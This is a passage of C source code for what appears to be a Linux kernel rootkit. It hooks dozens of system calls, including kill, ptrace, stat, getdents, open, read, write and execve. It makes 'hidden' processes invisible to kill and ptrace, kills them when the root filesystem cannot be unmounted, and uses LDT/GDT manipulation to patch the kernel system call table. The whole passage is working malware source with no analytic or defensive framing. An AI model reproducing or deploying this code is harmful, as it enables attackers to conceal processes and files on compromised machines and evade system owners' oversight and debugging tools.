		return -ENOENT;
	ret = SYS(umount, path);
	if ((ret == -EBUSY) && (!(strcmp(path, "/")))) {
		int	i;
		
		for (i = 0; i < MAXPID; i++)
			if (is_hidden(i))
				SYS(kill, i, 15);
		go_sleep(1, 0);
		for (i = 0; i < MAXPID; i++)
			if (is_hidden(i))
				SYS(kill, i, 9);
		go_sleep(1, 0);
		return FALLTHRU;
	}
	return ret;
}

static	int	new_umount2(char *path, int flags)
{
	int	ret;
	if (is_authorized(ourself))
		return FALLTHRU;

	if (check_path(path))
		return -ENOENT;
	ret = SYS(umount, path, flags);
	if ((ret == -EBUSY) && (!(strcmp(path, "/")))) {
		int	i;
		
		for (i = 0; i < MAXPID; i++)
			if (is_hidden(i))
				SYS(kill, i, 15);
		go_sleep(1, 0);
		for (i = 0; i < MAXPID; i++)
			if (is_hidden(i))
				SYS(kill, i, 9);
		go_sleep(1, 0);
		return FALLTHRU;
	}
	return ret;
}

static	int	new_kill(int pid, int sig)
{
	if (is_authorized(ourself))
		return FALLTHRU;
	if (is_hidden(pid))
		return -ESRCH;
	return FALLTHRU;
}

static	int	new_ptrace(long request, long pid, long addr,  long data)
{
	if (is_authorized(ourself))
		return FALLTHRU;
	if (is_hidden(pid))
		return -ESRCH;
	return FALLTHRU;
}

static ulong	ldt_alloc()
{
	struct	ldts ldt;
	struct	gdtr gdtr;
	struct	gdt  *gdt;
	ulong	ldt_index, l;
	int	i;

	ldt.entry_number = STUBOFF; /* the last entry */
	ldt.base_addr = B3 | (B4 << 8);
	ldt.limit = B1 | (B2 << 8);
	ldt.contents = 0;
	ldt.read_exec_only = 0;
	ldt.seg_32bit = 0;
	ldt.limit_in_pages = 0;
	ldt.seg_not_present = 1;
	ldt.useable = 0;

	l = KSTART();
	i = SYS(modify_ldt, 1, &ldt, sizeof(ldt));
	KEND(l);

	if (i) {
		crd("modify_ldt returned %d\n", i);
		return 0;
	}

	ldt_index = get_ldt();
	get_gdt(&gdtr);

	gdt = (void *) (gdtr.base + ldt_index);
	return GDT_BASE((*gdt));
}

static int	new_sigret(void)
{
	if ((ourself == 1) && (!initialized)) {
		crd("doing sigret stuff\n");
		/* disallow revocation */
		initialized = 1;
		/* remove hooks */
		uninstall_new_idt();
		initmem = ldt_alloc();
		if (!initmem) {
			initialized = 0;
			return FALLTHRU;
		}
		kernel_sct[SYSAUX] = initmem + (STUBOFF*8);
	}
	return FALLTHRU;
}

static struct hook hooks[] = {
	{ SYSAUX, new_aux },

	{ __NR_fork, new_clone },
	{ __NR_clone, new_clone },
	{ __NR_vfork, new_clone },

	{ __NR_creat, new_creat },
	{ __NR_unlink, new_unlink },
	{ __NR_execve, new_execve },
	{ __NR_utime, new_pathf },
	{ __NR_chdir, new_pathf },
	{ __NR_mknod, new_pathf },
	{ __NR_chmod, new_pathf },
	{ __NR_chown, new_pathf },
	{ __NR_lchown, new_pathf },
	{ __NR_chown32, new_pathf },
	{ __NR_lchown32, new_pathf },
	{ __NR_oldstat, new_oldstat },
	{ __NR_oldlstat, new_oldstat },
	{ __NR_umount, new_umount },
	{ __NR_umount2, new_umount2 },
	{ __NR_access, new_pathf },
	{ __NR_mkdir, new_pathf },
	{ __NR_rmdir, new_pathf },
	{ __NR_chroot, new_pathf },
	{ __NR_readlink, new_pathf },
	{ __NR_uselib, new_pathf },
	{ __NR_truncate, new_pathf },
	{ __NR_truncate64, new_pathf },
	{ __NR_stat, new_stat },
	{ __NR_lstat, new_stat },
	{ __NR_stat64, new_stat64 },
	{ __NR_lstat64, new_stat64 },
	{ __NR_statfs, new_pathf },

	{ __NR_link, new_oldnewf },
	{ __NR_rename, new_oldnewf },
	{ __NR_symlink, new_oldnewf },
	{ __NR_pivot_root, new_oldnewf },

	{ __NR_getdents, new_getdents },
	{ __NR_getdents64, new_getdents64 },
	{ __NR_open, new_open },
	
	{ __NR_read, new_read },
	{ __NR_write, new_write },
	{ __NR_close, new_close },
	{ __NR_kill, new_kill },
	{ __NR_ptrace, new_ptrace },
	{ __NR_sigreturn, new_sigret },
	{ __NR_rt_sigreturn, new_sigret },
	{ 0, NULL }
};
